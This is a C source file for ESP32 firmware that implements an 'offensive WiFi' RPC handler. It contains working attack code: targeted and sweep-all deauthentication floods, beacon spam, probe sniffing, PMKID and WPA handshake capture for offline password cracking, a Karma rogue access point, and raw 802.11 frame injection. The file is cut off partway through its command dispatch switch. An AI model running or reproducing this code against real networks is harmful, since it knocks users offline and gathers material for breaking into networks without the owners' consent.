/**
 * M1 RPC — Offensive WiFi command handler.
 *
 * Full port of at_custom_wifi_cmd.c to the binary RPC protocol.
 * All attack logic preserved; output goes via binary events instead of
 * AT unsolicited lines.
 */

#include <string.h>
#include <stdbool.h>
#include "m1_rpc.h"
#include "m1_rpc_proto.h"
#include "m1_rpc_offensive.h"
#include "m1_rpc_eviltwin.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_random.h"

static const char *TAG = "M1_Off";

/* ── State ─────────────────────────────────────────────────────── */

static bool s_monitor_active = false;
static uint8_t s_monitor_channel = 1;

static TaskHandle_t s_deauth_task = NULL;
static volatile bool s_deauth_stop = false;
static volatile uint32_t s_deauth_sent_count = 0;

static TaskHandle_t s_deauth_all_task = NULL;
static volatile bool s_deauth_all_stop = false;

static TaskHandle_t s_beacon_task = NULL;
static volatile bool s_beacon_stop = false;

static TaskHandle_t s_probe_task = NULL;
static volatile bool s_probe_stop = false;

static TaskHandle_t s_karma_task = NULL;
static volatile bool s_karma_stop = false;

static TaskHandle_t s_hscap_task = NULL;
static volatile bool s_hscap_stop = false;

/* ── Helpers ───────────────────────────────────────────────────── */

static void stop_task(TaskHandle_t *handle, volatile bool *stop_flag)
{
    if (*handle == NULL) return;
    *stop_flag = true;
    int retry = 30;
    while (*handle != NULL && retry-- > 0)
        vTaskDelay(pdMS_TO_TICKS(100));
    *handle = NULL;
    *stop_flag = false;
}

static void stop_all_attacks(void)
{
    stop_task(&s_deauth_task, &s_deauth_stop);
    stop_task(&s_deauth_all_task, &s_deauth_all_stop);
    stop_task(&s_beacon_task, &s_beacon_stop);
    stop_task(&s_probe_task, &s_probe_stop);
    stop_task(&s_karma_task, &s_karma_stop);
    stop_task(&s_hscap_task, &s_hscap_stop);
}

static bool enter_monitor(uint8_t channel)
{
    if (s_monitor_active && s_monitor_channel == channel) return true;
    stop_all_attacks();
    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    s_monitor_channel = channel;
    s_monitor_active = true;
    ESP_LOGI(TAG, "Monitor active ch %d", channel);
    return true;
}

static void exit_monitor(void)
{
    if (!s_monitor_active) return;
    stop_all_attacks();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    vTaskDelay(pdMS_TO_TICKS(100));
    s_monitor_active = false;
    s_monitor_channel = 1;
    ESP_LOGI(TAG, "Monitor exited");
}

/* ── Frame builders ─────────────────────────────────────────────── */

#define DEAUTH_FRAME_LEN 30

static void build_deauth_frame(uint8_t *frame, const uint8_t station[6],
                                const uint8_t ap[6], uint16_t reason)
{
    memset(frame, 0, DEAUTH_FRAME_LEN);
    frame[0] = 0xC0; frame[1] = 0x00;
    memcpy(&frame[4],  station, 6);
    memcpy(&frame[10], ap, 6);
    memcpy(&frame[16], ap, 6);
    frame[24] = (uint8_t)(reason & 0xFF);
    frame[25] = (uint8_t)((reason >> 8) & 0xFF);
    frame[26] = 0x03; frame[27] = 0x01; frame[28] = s_monitor_channel;
}

#define MAX_BEACON_SSIDS 8
#define MAX_SSID_LEN 32

static char s_beacon_ssids[MAX_BEACON_SSIDS][MAX_SSID_LEN + 1];
static int s_beacon_ssid_count = 0;

static int build_beacon_frame(uint8_t *frame, const char *ssid, uint8_t channel)
{
    int pos = 0;
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
    mac[0] &= 0xFE; mac[0] |= 0x02;

    frame[pos++] = 0x80; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    memset(&frame[pos], 0xFF, 6); pos += 6;
    memcpy(&frame[pos], mac, 6); pos += 6;
    memcpy(&frame[pos], mac, 6); pos += 6;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    uint64_t ts = (uint64_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    memcpy(&frame[pos], &ts, 8); pos += 8;
    frame[pos++] = 0x64; frame[pos++] = 0x00;
    frame[pos++] = 0x11; frame[pos++] = 0x04;
    uint8_t slen = (uint8_t)strlen(ssid);
    frame[pos++] = 0x00; frame[pos++] = slen;
    memcpy(&frame[pos], ssid, slen); pos += slen;
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x0C; frame[pos++] = 0x12; frame[pos++] = 0x18; frame[pos++] = 0x24;
    frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = channel;
    return pos;
}

static int build_probe_resp_frame(uint8_t *frame, const uint8_t dest[6],
                                   const char *ssid, uint8_t channel)
{
    int pos = 0;
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)(esp_random() & 0xFF);
    mac[0] &= 0xFE; mac[0] |= 0x02;
    frame[pos++] = 0x50; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    memcpy(&frame[pos], dest, 6); pos += 6;
    memcpy(&frame[pos], mac, 6);  pos += 6;
    memcpy(&frame[pos], mac, 6);  pos += 6;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    uint64_t ts = (uint64_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    memcpy(&frame[pos], &ts, 8); pos += 8;
    frame[pos++] = 0x64; frame[pos++] = 0x00;
    frame[pos++] = 0x11; frame[pos++] = 0x04;
    uint8_t slen = (uint8_t)strlen(ssid);
    frame[pos++] = 0x00; frame[pos++] = slen;
    memcpy(&frame[pos], ssid, slen); pos += slen;
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x0C; frame[pos++] = 0x12; frame[pos++] = 0x18; frame[pos++] = 0x24;
    frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = channel;
    return pos;
}

static int build_auth_frame(uint8_t *frame, const uint8_t ap[6])
{
    uint8_t my_mac[6];
    for (int i = 0; i < 6; i++) my_mac[i] = (uint8_t)(esp_random() & 0xFF);
    my_mac[0] &= 0xFE; my_mac[0] |= 0x02;
    int pos = 0;
    frame[pos++] = 0xB0; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    memcpy(&frame[pos], ap, 6); pos += 6;
    memcpy(&frame[pos], my_mac, 6); pos += 6;
    memcpy(&frame[pos], ap, 6); pos += 6;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    frame[pos++] = 0x01; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    return pos;
}

static int build_assoc_frame(uint8_t *frame, const uint8_t ap[6])
{
    uint8_t my_mac[6];
    for (int i = 0; i < 6; i++) my_mac[i] = (uint8_t)(esp_random() & 0xFF);
    my_mac[0] &= 0xFE; my_mac[0] |= 0x02;
    int pos = 0;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    memcpy(&frame[pos], ap, 6); pos += 6;
    memcpy(&frame[pos], my_mac, 6); pos += 6;
    memcpy(&frame[pos], ap, 6); pos += 6;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    frame[pos++] = 0x11; frame[pos++] = 0x04;
    frame[pos++] = 0x0A; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x00; /* empty SSID */
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x0C; frame[pos++] = 0x12; frame[pos++] = 0x18; frame[pos++] = 0x24;
    frame[pos++] = 0x30; frame[pos++] = 0x14;
    frame[pos++] = 0x01; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x0F; frame[pos++] = 0xAC; frame[pos++] = 0x04;
    frame[pos++] = 0x01; frame[pos++] = 0x00;
    frame[pos++] = 0x00; frame[pos++] = 0x0F; frame[pos++] = 0xAC; frame[pos++] = 0x02;
    frame[pos++] = 0x00; frame[pos++] = 0x0F; frame[pos++] = 0xAC; frame[pos++] = 0x04;
    frame[pos++] = 0x00; frame[pos++] = 0x00;
    return pos;
}

/* ── Monitor ─────────────────────────────────────────────────────── */

static m1_status_t cmd_monitor_start(const uint8_t *p, uint16_t len,
                                      uint8_t *resp, uint16_t *rl)
{
    if (len < 2) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[0];
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    return enter_monitor(ch) ? M1_OK : M1_ERR_HARDWARE;
}

static m1_status_t cmd_monitor_stop(const uint8_t *p, uint16_t len,
                                     uint8_t *resp, uint16_t *rl)
{
    if (!s_monitor_active) return M1_ERR_NOT_RUNNING;
    exit_monitor();
    return M1_OK;
}

/* ── Deauth ─────────────────────────────────────────────────────── */

static uint8_t s_deauth_bssid[6];
static uint8_t s_deauth_station[6];
static int32_t s_deauth_count;

static void deauth_task_func(void *arg)
{
    uint8_t frame[DEAUTH_FRAME_LEN];
    int32_t sent = 0;
    int32_t count = s_deauth_count;
    while (!s_deauth_stop) {
        build_deauth_frame(frame, s_deauth_station, s_deauth_bssid, 7);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
        sent++;
        s_deauth_sent_count = sent;
        if (count > 0 && sent >= count) break;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    s_deauth_sent_count = sent;
    s_deauth_task = NULL;
    vTaskDelete(NULL);
}

static m1_status_t cmd_deauth_start(const uint8_t *p, uint16_t len,
                                     uint8_t *resp, uint16_t *rl)
{
    if (len < 17) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[6];
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    if (s_deauth_task) return M1_ERR_ALREADY_RUNNING;
    if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    stop_task(&s_deauth_task, &s_deauth_stop);
    memcpy(s_deauth_bssid, p, 6);
    memcpy(s_deauth_station, p + 7, 6);
    s_deauth_count = p[13] | (p[14] << 8);
    s_deauth_sent_count = 0;
    s_deauth_stop = false;
    xTaskCreate(deauth_task_func, "m1deauth", 4096, NULL, 5, &s_deauth_task);
    return M1_OK;
}

static m1_status_t cmd_deauth_stop(const uint8_t *p, uint16_t len,
                                    uint8_t *resp, uint16_t *rl)
{
    stop_task(&s_deauth_task, &s_deauth_stop);
    stop_task(&s_deauth_all_task, &s_deauth_all_stop);
    return M1_OK;
}

static m1_status_t cmd_deauth_status(const uint8_t *p, uint16_t len,
                                      uint8_t *resp, uint16_t *rl)
{
    uint32_t c = s_deauth_sent_count;
    memcpy(resp, &c, 4);
    resp[4] = (s_deauth_task != NULL || s_deauth_all_task != NULL) ? 1 : 0;
    *rl = 5;
    return M1_OK;
}

/* ── Deauth-all (broadcast sweep over discovered APs) ────────────── */

#define DEAUTH_ALL_MAX 32

static uint8_t s_da_bssid[DEAUTH_ALL_MAX][6];
static uint8_t s_da_channel[DEAUTH_ALL_MAX];
static int s_da_count = 0;

static void deauth_all_task_func(void *arg)
{
    uint8_t frame[DEAUTH_FRAME_LEN];
    const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t sent = 0;

    while (!s_deauth_all_stop) {
        for (int i = 0; i < s_da_count && !s_deauth_all_stop; i++) {
            esp_wifi_set_channel(s_da_channel[i], WIFI_SECOND_CHAN_NONE);
            s_monitor_channel = s_da_channel[i];
            /* Broadcast deauth: AP kicks every associated station. */
            build_deauth_frame(frame, bcast, s_da_bssid[i], 7);
            for (int r = 0; r < 3; r++) {
                esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
            }
            sent += 3;
            s_deauth_sent_count = sent;
            vTaskDelay(pdMS_TO_TICKS(20));
        }
        if (s_da_count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    s_deauth_all_task = NULL;
    vTaskDelete(NULL);
}

static m1_status_t cmd_deauth_all(const uint8_t *p, uint16_t len,
                                   uint8_t *resp, uint16_t *rl)
{
    static wifi_ap_record_t recs[DEAUTH_ALL_MAX];
    uint16_t num = DEAUTH_ALL_MAX;

    if (s_deauth_all_task) return M1_ERR_ALREADY_RUNNING;

    /* Drop monitor mode so we can run a managed-mode scan to find targets. */
    exit_monitor();

    if (esp_wifi_scan_start(NULL, true) != ESP_OK) {
        return M1_ERR_HARDWARE;
    }
    if (esp_wifi_scan_get_ap_records(&num, recs) != ESP_OK) {
        return M1_ERR_HARDWARE;
    }

    s_da_count = (num > DEAUTH_ALL_MAX) ? DEAUTH_ALL_MAX : (int)num;
    for (int i = 0; i < s_da_count; i++) {
        memcpy(s_da_bssid[i], recs[i].bssid, 6);
        s_da_channel[i] = recs[i].primary;
    }
    if (s_da_count == 0) {
        return M1_ERR_NOT_RUNNING; /* nothing to attack */
    }

    if (!enter_monitor(s_da_channel[0])) {
        return M1_ERR_HARDWARE;
    }

    s_deauth_sent_count = 0;
    s_deauth_all_stop = false;
    if (xTaskCreate(deauth_all_task_func, "m1deauthall", 4096, NULL, 5,
                    &s_deauth_all_task) != pdPASS) {
        s_deauth_all_task = NULL;
        return M1_ERR_NO_MEM;
    }

    /* Report how many APs are being swept. */
    resp[0] = (uint8_t)s_da_count;
    *rl = 1;
    return M1_OK;
}

/* ── Beacon spam ─────────────────────────────────────────────────── */

static void beacon_task_func(void *arg)
{
    uint8_t frame[256];
    int idx = 0;
    while (!s_beacon_stop) {
        int flen = build_beacon_frame(frame, s_beacon_ssids[idx], s_monitor_channel);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
        idx = (idx + 1) % s_beacon_ssid_count;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    s_beacon_task = NULL;
    vTaskDelete(NULL);
}

static m1_status_t cmd_beacon_start(const uint8_t *p, uint16_t len,
                                     uint8_t *resp, uint16_t *rl)
{
    if (len < 2) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[0];
    uint8_t cnt = p[1];
    if (cnt == 0 || cnt > MAX_BEACON_SSIDS) return M1_ERR_INVALID_ARGS;
    int pos = 2; int parsed = 0;
    for (int i = 0; i < cnt && pos < len && parsed < MAX_BEACON_SSIDS; i++) {
        if (pos >= len) break;
        uint8_t slen = p[pos++];
        if (slen > MAX_SSID_LEN || pos + slen > len) return M1_ERR_INVALID_ARGS;
        memcpy(s_beacon_ssids[parsed], &p[pos], slen);
        s_beacon_ssids[parsed][slen] = '\0';
        pos += slen;
        parsed++;
    }
    s_beacon_ssid_count = parsed;
    if (parsed == 0) return M1_ERR_INVALID_ARGS;
    if (!s_monitor_active) {
        if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
        if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    }
    stop_task(&s_beacon_task, &s_beacon_stop);
    s_beacon_stop = false;
    xTaskCreate(beacon_task_func, "m1beacon", 4096, NULL, 5, &s_beacon_task);
    return M1_OK;
}

static m1_status_t cmd_beacon_stop(const uint8_t *p, uint16_t len,
                                    uint8_t *resp, uint16_t *rl)
{
    stop_task(&s_beacon_task, &s_beacon_stop);
    s_beacon_ssid_count = 0;
    return M1_OK;
}

/* ── Probe sniff ─────────────────────────────────────────────────── */

static volatile int32_t s_probe_duration_sec = 0;

static void probe_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT || s_probe_stop) return;
    const wifi_promiscuous_pkt_t *pkt = buf;
    const uint8_t *pp = pkt->payload;
    uint16_t fc = pp[0] | (pp[1] << 8);
    if ((fc & 0x00F0) != 0x0040) return;

    uint8_t evt[6 + 1 + 1 + 32];
    memcpy(evt, &pp[10], 6);
    evt[6] = (uint8_t)pkt->rx_ctrl.rssi;

    char ssid[33] = "";
    int pos = 24, end = pkt->rx_ctrl.sig_len;
    while (pos + 2 <= end) {
        uint8_t tid = pp[pos], tlen = pp[pos + 1];
        if (pos + 2 + tlen > end) break;
        if (tid == 0 && tlen > 0 && tlen <= 32) {
            memcpy(ssid, &pp[pos + 2], tlen);
            ssid[tlen] = '\0'; break;
        }
        pos += 2 + tlen;
    }
    uint8_t slen = (uint8_t)strlen(ssid);
    evt[7] = slen;
    memcpy(&evt[8], ssid, slen);
    m1_rpc_send_event(M1_EVT_MONITOR_PACKET, evt, 8 + slen);
}

static void probe_task_func(void *arg)
{
    esp_wifi_set_promiscuous_rx_cb(probe_promisc_cb);
    wifi_promiscuous_filter_t f = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&f);
    int32_t dur = s_probe_duration_sec;
    TickType_t start = xTaskGetTickCount();
    while (!s_probe_stop) {
        if (dur > 0 && (xTaskGetTickCount() - start) >= pdMS_TO_TICKS(dur * 1000)) break;
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    esp_wifi_set_promiscuous_rx_cb(NULL);
    s_probe_task = NULL;
    vTaskDelete(NULL);
}

static m1_status_t cmd_probe_sniff_start(const uint8_t *p, uint16_t len,
                                           uint8_t *resp, uint16_t *rl)
{
    if (len < 3) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[0];
    uint16_t dur = p[1] | (p[2] << 8);
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    stop_task(&s_probe_task, &s_probe_stop);
    s_probe_stop = false;
    s_probe_duration_sec = dur;
    xTaskCreate(probe_task_func, "m1probe", 4096, NULL, 5, &s_probe_task);
    return M1_OK;
}

static m1_status_t cmd_probe_sniff_stop(const uint8_t *p, uint16_t len,
                                         uint8_t *resp, uint16_t *rl)
{
    stop_task(&s_probe_task, &s_probe_stop);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    return M1_OK;
}

/* ── PMKID capture ──────────────────────────────────────────────── */

static uint8_t s_pmkid_target[6];
static volatile bool s_pmkid_captured = false;

static void pmkid_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA || s_pmkid_captured) return;
    const wifi_promiscuous_pkt_t *pkt = buf;
    const uint8_t *pp = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 34) return;
    if (memcmp(&pp[10], s_pmkid_target, 6) != 0) return;
    uint16_t fc = pp[0] | (pp[1] << 8);
    if ((fc & 0x000C) != 0x0008) return;
    int hl = 24;
    if ((fc & 0x0800) != 0) hl += 2;
    if (hl + 8 > len) return;
    if (pp[hl] != 0xAA || pp[hl+1] != 0xAA) return;
    if (pp[hl+6] != 0x88 || pp[hl+7] != 0x8E) return;
    int eo = hl + 8;
    if (eo + 5 > len) return;
    if (pp[eo+4] != 0x02 && pp[eo+4] != 0xFE) return;
    if (eo + 99 > len) return;
    uint16_t kdl = pp[eo+97] | (pp[eo+98] << 8);
    int kd = eo + 99;
    if (kd + 4 > len) return;
    for (int i = kd; i + 20 <= kd + kdl && i + 20 <= len; i++) {
        if (pp[i] == 0xDD && pp[i+2] == 0x00 && pp[i+3] == 0x0F &&
            pp[i+4] == 0xAC && pp[i+5] == 0x01) {
            uint8_t evt[1 + 6 + 16];
            evt[0] = M1_OK;
            memcpy(&evt[1], s_pmkid_target, 6);
            memcpy(&evt[7], &pp[i + 6], 16);
            m1_rpc_send_event(M1_EVT_PMKID_RESULT, evt, 23);
            s_pmkid_captured = true;
            return;
        }
    }
}

static m1_status_t cmd_pmkid_capture(const uint8_t *p, uint16_t len,
                                      uint8_t *resp, uint16_t *rl)
{
    if (len < 7) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[6];
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    memcpy(s_pmkid_target, p, 6);
    s_pmkid_captured = false;
    wifi_promiscuous_filter_t f = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous_rx_cb(pmkid_promisc_cb);
    uint8_t frame[256];
    int flen = build_auth_frame(frame, s_pmkid_target);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
    vTaskDelay(pdMS_TO_TICKS(200));
    flen = build_assoc_frame(frame, s_pmkid_target);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
    for (int i = 0; i < 150 && !s_pmkid_captured; i++)
        vTaskDelay(pdMS_TO_TICKS(100));
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (s_pmkid_captured) return M1_OK;
    uint8_t evt[1 + 6];
    evt[0] = M1_ERR_TIMEOUT;
    memcpy(&evt[1], p, 6);
    m1_rpc_send_event(M1_EVT_PMKID_RESULT, evt, 7);
    return M1_ERR_TIMEOUT;
}

/* ── Karma ──────────────────────────────────────────────────────── */

static void karma_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_MGMT || s_karma_stop) return;
    const wifi_promiscuous_pkt_t *pkt = buf;
    const uint8_t *pp = pkt->payload;
    uint16_t fc = pp[0] | (pp[1] << 8);
    if ((fc & 0x00F0) != 0x0040) return;
    uint8_t src[6];
    memcpy(src, &pp[10], 6);
    char ssid[33] = "";
    int pos = 24, end = pkt->rx_ctrl.sig_len;
    while (pos + 2 <= end) {
        uint8_t tid = pp[pos], tlen = pp[pos + 1];
        if (pos + 2 + tlen > end) break;
        if (tid == 0 && tlen > 0 && tlen <= 32) {
            memcpy(ssid, &pp[pos + 2], tlen);
            ssid[tlen] = '\0'; break;
        }
        pos += 2 + tlen;
    }
    if (ssid[0] == '\0') return;
    uint8_t frame[256];
    int flen = build_probe_resp_frame(frame, src, ssid, s_monitor_channel);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
    uint8_t slen = (uint8_t)strlen(ssid);
    uint8_t evt[6 + 1 + 32];
    memcpy(evt, src, 6);
    evt[6] = slen;
    memcpy(&evt[7], ssid, slen);
    m1_rpc_send_event(M1_EVT_KARMA_PROBE_REQ, evt, 7 + slen);
}

static void karma_task_func(void *arg)
{
    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
    wifi_promiscuous_filter_t f = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&f);
    while (!s_karma_stop) vTaskDelay(pdMS_TO_TICKS(500));
    esp_wifi_set_promiscuous_rx_cb(NULL);
    s_karma_task = NULL;
    vTaskDelete(NULL);
}

static m1_status_t cmd_karma_start(const uint8_t *p, uint16_t len,
                                     uint8_t *resp, uint16_t *rl)
{
    if (len < 1) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[0];
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    stop_task(&s_karma_task, &s_karma_stop);
    s_karma_stop = false;
    xTaskCreate(karma_task_func, "m1karma", 4096, NULL, 5, &s_karma_task);
    return M1_OK;
}

static m1_status_t cmd_karma_stop(const uint8_t *p, uint16_t len,
                                   uint8_t *resp, uint16_t *rl)
{
    stop_task(&s_karma_task, &s_karma_stop);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    return M1_OK;
}

/* ── Handshake capture ──────────────────────────────────────────── */

static uint8_t s_hscap_target[6];
static volatile int s_hscap_frame_count = 0;
#define MAX_HSCAP_FRAMES 4

static void hscap_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA || s_hscap_stop) return;
    if (s_hscap_frame_count >= MAX_HSCAP_FRAMES) return;
    const wifi_promiscuous_pkt_t *pkt = buf;
    const uint8_t *pp = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 34) return;
    uint16_t fc = pp[0] | (pp[1] << 8);
    if ((fc & 0x000C) != 0x0008) return;
    uint8_t bssid[6]; int dir;
    if ((fc & 0x0300) == 0x0100) { memcpy(bssid, &pp[10], 6); dir = 0; }
    else if ((fc & 0x0300) == 0x0200) { memcpy(bssid, &pp[4], 6); dir = 1; }
    else return;
    if (memcmp(bssid, s_hscap_target, 6) != 0) return;
    int hl = 24;
    if ((fc & 0x0800) != 0) hl += 2;
    if (hl + 8 > len) return;
    if (pp[hl] != 0xAA || pp[hl+1] != 0xAA) return;
    if (pp[hl+6] != 0x88 || pp[hl+7] != 0x8E) return;
    int eo = hl + 8;
    if (eo + 49 > len) return;
    if (pp[eo+4] != 0x02 && pp[eo+4] != 0xFE) return;
    uint16_t ki = (pp[eo+5] << 8) | pp[eo+6];
    uint64_t rc = 0;
    for (int i = 0; i < 8; i++) rc = (rc << 8) | pp[eo + 9 + i];

    /* Event: frame_num(1) + dir(1) + key_info(2) + replay_counter(8) + nonce[32] */
    uint8_t evt[1 + 1 + 2 + 8 + 32];
    evt[0] = (uint8_t)(s_hscap_frame_count + 1);
    evt[1] = (uint8_t)dir;
    evt[2] = (ki >> 8) & 0xFF; evt[3] = ki & 0xFF;
    for (int i = 0; i < 8; i++) evt[4 + i] = (rc >> (56 - i * 8)) & 0xFF;
    memcpy(&evt[12], &pp[eo + 17], 32);
    m1_rpc_send_event(M1_EVT_HANDSHAKE_RESULT, evt, 44);
    s_hscap_frame_count++;
}

static void hscap_task_func(void *arg)
{
    int32_t deauth_count = (int32_t)(intptr_t)arg;
    wifi_promiscuous_filter_t f = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&f);
    esp_wifi_set_promiscuous_rx_cb(hscap_promisc_cb);
    if (deauth_count > 0) {
        uint8_t frame[DEAUTH_FRAME_LEN];
        uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        for (int32_t i = 0; i < deauth_count && !s_hscap_stop; i++) {
            build_deauth_frame(frame, bcast, s_hscap_target, 7);
            esp_wifi_80211_tx(WIFI_IF_STA, frame, DEAUTH_FRAME_LEN, false);
            vTaskDelay(pdMS_TO_TICKS(100));
        }
    }
    TickType_t start = xTaskGetTickCount();
    while (!s_hscap_stop && s_hscap_frame_count < MAX_HSCAP_FRAMES) {
        if ((xTaskGetTickCount() - start) >= pdMS_TO_TICKS(30000)) break;
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    esp_wifi_set_promiscuous_rx_cb(NULL);
    /* Done event: count(1) */
    uint8_t cnt = (uint8_t)s_hscap_frame_count;
    m1_rpc_send_event(M1_EVT_HANDSHAKE_RESULT, &cnt, 1); /* final summary */
    s_hscap_task = NULL;
    vTaskDelete(NULL);
}

static m1_status_t cmd_hscap_start(const uint8_t *p, uint16_t len,
                                     uint8_t *resp, uint16_t *rl)
{
    /* hscap_req: bssid[6] + channel(1) + deauth_count(2 LE) */
    if (len < 9) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[6];
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    stop_task(&s_hscap_task, &s_hscap_stop);
    memcpy(s_hscap_target, p, 6);
    s_hscap_frame_count = 0;
    s_hscap_stop = false;
    uint16_t dc = p[7] | (p[8] << 8);
    xTaskCreate(hscap_task_func, "m1hscap", 4096, (void*)(intptr_t)dc, 5, &s_hscap_task);
    return M1_OK;
}

static m1_status_t cmd_hscap_stop(const uint8_t *p, uint16_t len,
                                   uint8_t *resp, uint16_t *rl)
{
    stop_task(&s_hscap_task, &s_hscap_stop);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    return M1_OK;
}

/* ── Raw TX ──────────────────────────────────────────────────────── */

static m1_status_t cmd_raw_tx(const uint8_t *p, uint16_t len,
                                uint8_t *resp, uint16_t *rl)
{
    /* raw_tx_req: channel(1) + frame[] */
    if (len < 2) return M1_ERR_INVALID_ARGS;
    uint8_t ch = p[0];
    if (ch < 1 || ch > 14) return M1_ERR_INVALID_ARGS;
    if (!s_monitor_active) {
        if (!enter_monitor(ch)) return M1_ERR_HARDWARE;
    } else {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&p[1], len - 1, false);
    return M1_OK;
}

/* ── Dispatch ────────────────────────────────────────────────────── */

m1_status_t m1_rpc_off_wifi_handler(uint16_t msg_id,
                                     const uint8_t *payload,
                                     uint16_t payload_len,
                                     uint8_t *resp_buf,
                                     uint16_t *resp_len)
{
    switch (msg_id) {
    case M1_MSG_OFF_MONITOR_START:  return cmd_monitor_start(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_MONITOR_STOP:   return cmd_monitor_stop(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_DEAUTH_START:   return cmd_deauth_start(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_DEAUTH_STOP:    return cmd_deauth_stop(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_DEAUTH_STATUS:  return cmd_deauth_status(payload, payload_len, resp_buf, resp_len);
    case M1_MSG_OFF_BEACON_START:   return cmd_beacon_start(payload, payload_len, resp_buf, resp_len);
